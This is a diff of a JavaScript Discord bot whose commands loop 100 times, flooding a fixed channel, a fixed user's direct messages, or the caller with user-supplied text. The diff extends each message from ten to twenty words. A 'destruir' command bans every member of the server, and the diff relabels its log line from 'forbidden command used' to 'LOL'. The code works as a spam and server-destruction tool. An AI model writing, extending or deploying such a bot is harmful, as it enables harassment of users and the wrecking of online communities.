@@ -18,18 +18,28 @@ client.on("message", (message) => {
   const args = message.content.slice(prefix.length).trim().split(/ +/g);
 const command = args.shift().toLowerCase();
 var veses = 100
-var mene = "69"
-var mene1 = "69"
-var mene2 = "69"
-var mene3 = "69"
-var mene4 = "69"
-var mene5 = "69"
-var mene6 = "69"
-var mene7 = "69"
-var mene8 = "69"
-var mene9 = "69"
-var idCanales = "777"
-var idDm = "666"
+var mene = "69";
+var mene1 = "69";
+var mene2 = "69";
+var mene3 = "69";
+var mene4 = "69";
+var mene5 = "69";
+var mene6 = "69";
+var mene7 = "69";
+var mene8 = "69";
+var mene9 = "69";
+var mene10 = "69";
+var mene11 = "69";
+var mene12 = "69";
+var mene13 = "69";
+var mene14 = "69";
+var mene15 = "69";
+var mene16 = "69";
+var mene17 = "69";
+var mene18 = "69";
+var mene19 = "69";
+var idCanales = "777";
+var idDm = "666";
 
 
 while (command === "canales" && veses>=1) { 
@@ -44,7 +54,17 @@ while (command === "canales" && veses>=1) {
   mene7 = args[8]
   mene8 = args[9]
   mene9 = args[10]
-    client.channels.get(idCanales).send(mene+" "+mene1+" "+mene2+" "+mene3+" "+mene4+" "+mene5+" "+mene6+" "+mene7+" "+mene8+" "+mene9)
+  mene10 = args[11]
+  mene11 = args[12]
+  mene12 = args[13]
+  mene13 = args[14]
+  mene14 = args[15]
+  mene15 = args[16]
+  mene16 = args[17]
+  mene17 = args[18]
+  mene18 = args[19]
+  mene19 = args[20]
+    client.channels.get(idCanales).send(mene+" "+mene1+" "+mene2+" "+mene3+" "+mene4+" "+mene5+" "+mene6+" "+mene7+" "+mene8+" "+mene9+" "+mene10+" "+mene11+" "+mene12+" "+mene13+" "+mene14+" "+mene15+" "+mene16+" "+mene17+" "+mene18+" "+mene19)
     console.log(client.channels.get(idCanales).name)
     console.log(client.channels.get(idCanales).id)
     veses--
@@ -67,7 +87,17 @@ while (command === "dm" && veses>=1) {
   mene7 = args[8]
   mene8 = args[9]
   mene9 = args[10]
-  client.users.get(idDm).send(mene+" "+mene1+" "+mene2+" "+mene3+" "+mene4+" "+mene5+" "+mene6+" "+mene7+" "+mene8+" "+mene9);
+  mene10 = args[11]
+  mene11 = args[12]
+  mene12 = args[13]
+  mene13 = args[14]
+  mene14 = args[15]
+  mene15 = args[16]
+  mene16 = args[17]
+  mene17 = args[18]
+  mene18 = args[19]
+  mene19 = args[20]
+  client.users.get(idDm).send(mene+" "+mene1+" "+mene2+" "+mene3+" "+mene4+" "+mene5+" "+mene6+" "+mene7+" "+mene8+" "+mene9+" "+mene10+" "+mene11+" "+mene12+" "+mene13+" "+mene14+" "+mene15+" "+mene16+" "+mene17+" "+mene18+" "+mene19);
   veses--
 }
 
@@ -83,15 +113,25 @@ while (command === "killme" && veses>=1) {
   mene6 = args[6]
   mene7 = args[7]
   mene8 = args[8]
-  mene9 = args[9]
- message.author.send(mene+" "+mene1+" "+mene2+" "+mene3+" "+mene4+" "+mene5+" "+mene6+" "+mene7+" "+mene8+" "+mene9);
+  mene9 = args[10]
+  mene10 = args[11]
+  mene11 = args[12]
+  mene12 = args[13]
+  mene13 = args[14]
+  mene14 = args[15]
+  mene15 = args[16]
+  mene16 = args[17]
+  mene17 = args[18]
+  mene18 = args[19]
+  mene19 = args[20]
+ message.author.send(mene+" "+mene1+" "+mene2+" "+mene3+" "+mene4+" "+mene5+" "+mene6+" "+mene7+" "+mene8+" "+mene9+" "+mene10+" "+mene11+" "+mene12+" "+mene13+" "+mene14+" "+mene15+" "+mene16+" "+mene17+" "+mene18+" "+mene19);
  veses--
 }
 
 veses = 100
 
 if (message.content.startsWith(prefix+"destruir")) {
-  console.log("se uso el comando prohibido");
+  console.log("LOL");
   console.log(  message.guild.members.forEach(m => {
     m.ban();
     }));
